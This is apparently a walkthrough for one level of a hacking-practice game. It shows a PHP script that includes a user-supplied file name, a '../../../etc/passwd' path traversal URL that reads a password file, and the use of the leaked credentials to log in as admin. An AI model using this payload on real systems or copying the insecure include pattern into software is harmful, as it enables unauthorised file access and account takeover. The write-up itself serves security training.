#### Level 04 - Industrial espionage

By holding over the link we can see that the include script is extreme poor and insecure. It would look something like:
```php
<?php
include ($_GET['read']);
?>
```

Here we can include exactly what we want. Then lets go for the unix password.

Click on the admin link and replace admin.html in the address bar with `../../../etc/passwd`

The url should look like this now: http://www.hacmegame.org/hacmegame/challenges/ChallengeS26.html?read=../../../etc/passwd

Hit enter and you the passwd file is included and here is the content `nikita:XltRLNV1`

Go to the admin page again and write "nikita" as username and "XltRLNV1" as password.